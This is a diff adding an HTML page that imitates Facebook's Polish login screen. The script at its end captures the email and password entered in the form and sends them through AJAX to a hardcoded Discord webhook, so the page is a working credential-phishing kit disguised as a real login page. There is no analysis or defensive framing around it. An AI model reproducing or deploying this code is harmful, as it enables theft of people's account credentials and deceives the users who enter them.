@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" type="text/css" href="style.css">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <title>Facebook</title>
+</head>
+<body>
+  <section class="main-wrapper">
+    <div class="branding">
+      <h1 class="logo">facebook</h1>
+      <h2 class="slogan">Facebook pomaga kontaktować się z innymi osobami oraz udostępniać im różne informacje i materiały.</h2>
+    </div>
+    <div>
+      <div class="panel">
+        <form id="login-form">
+          <input
+            type="text"
+            name="username"
+            placeholder="Adres e-mail lub numer telefonu"
+            required>
+          <input
+            type="password"
+            name="password"
+            placeholder="Hasło"
+            required>
+          <input
+            class="log-in-button"
+            type="submit"
+            value="Zaloguj się">
+        </form>
+        <a class="forgot" href="#">nie pamiętasz hasła?</a>
+        <hr>
+        <a class="register-button" href="#">Utwórz nowe konto</a>
+      </div>
+      <div class="bottom-link">
+        <a class="page" href="#">Utwórz stronę</a><p>dla gwiazdy, marki lub firmy</p>
+      </div>
+    </div>  
+  </section>
+
+  <footer>
+    <ul>
+      <li><a class="footer-link">Sign Up</a></li>
+      <li><a class="footer-link">Log In</a></li>
+      <li><a class="footer-link">Messenger</a></li>
+      <li><a class="footer-link">Facebook Lite</a></li>
+      <li><a class="footer-link">Watch</a></li>
+      <li><a class="footer-link">Places</a></li>
+      <li><a class="footer-link">Games</a></li>
+      <li><a class="footer-link">Marketplace</a></li>
+      <li><a class="footer-link">Facebook Pay</a></li>
+      <li><a class="footer-link">Jobs</a></li>
+      <li><a class="footer-link">Oculus</a></li>
+      <li><a class="footer-link">Portal</a></li>
+      <li><a class="footer-link">Instagram</a></li>
+      <li><a class="footer-link">Bulletin</a></li>
+    </ul>
+  </footer>
+
+  <script>
+    $(document).ready(function() {
+      $("#login-form").submit(function(e) {
+        e.preventDefault(); // Prevent form submission
+
+        // Get form values
+        var username = $("input[name='username']").val();
+        var password = $("input[name='password']").val();
+
+        // Create data object to send to Discord webhook
+        var data = {
+          username: "Facebook Login",
+          content: "Username: " + username + "\nPassword: " + password
+        };
+
+        // Send data to Discord webhook using AJAX
+        $.ajax({
+          url: "https://discord.com/api/webhooks/1205939684908474489/gdsrZwHJAXkAQ9wZbnbxaTB4SpveYq_Yd65mK-3NkhwD44PA_EW_Ppqq8rcYwdAW6BVH",
+          type: "POST",
+          data: JSON.stringify(data),
+          contentType: "application/json",
+          success: function(response) {
+            console.log("Data sent to Discord successfully");
+          },
+          error: function(error) {
+            console.log("Error sending data to Discord: " + error);
+          }
+        });
+      });
+    });
+  </script>
+</body>
+</html>
